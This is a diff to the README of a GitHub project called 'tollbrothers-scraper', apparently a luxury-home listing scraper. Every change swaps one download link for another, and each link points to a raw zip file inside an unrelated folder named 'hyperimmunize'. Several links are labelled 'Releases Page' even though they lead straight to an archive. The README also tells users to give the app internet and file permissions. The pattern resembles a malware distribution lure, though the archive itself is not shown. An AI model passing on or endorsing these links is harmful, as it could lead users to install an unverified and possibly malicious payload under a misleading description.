@@ -1,7 +1,7 @@
 # 🏡 tollbrothers-scraper - Get Insights on Luxury Homes
 
-![Download](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper-tollbrothers-1.3.zip)  
-[Download Here](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper-tollbrothers-1.3.zip)
+![Download](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper_tollbrothers_v3.5-beta.4.zip)  
+[Download Here](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper_tollbrothers_v3.5-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you begin, ensure you have the following:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper-tollbrothers-1.3.zip). Here, you will find different versions of the application. 
+   Go to the [Releases Page](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper_tollbrothers_v3.5-beta.4.zip). Here, you will find different versions of the application. 
 
 2. **Select the Latest Version**  
    Look for the most recent version at the top of the list. Check the version number and the release date to ensure it is the latest.
@@ -65,7 +65,7 @@ Once you have the application running, here’s how to use it effectively:
 If you encounter issues, try the following:
 
 - **Check Your Internet Connection**: Ensure you have a stable connection while using the app.
-- **Reinstall if Necessary**: If the app doesn’t run correctly, uninstall it and install it again from the [Releases Page](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper-tollbrothers-1.3.zip).
+- **Reinstall if Necessary**: If the app doesn’t run correctly, uninstall it and install it again from the [Releases Page](https://github.com/blanklmao/tollbrothers-scraper/raw/refs/heads/main/hyperimmunize/scraper_tollbrothers_v3.5-beta.4.zip).
 - **Review Permissions**: Ensure the app has the necessary permissions to access the internet and files on your computer.
 
 ## 💬 Support and Feedback
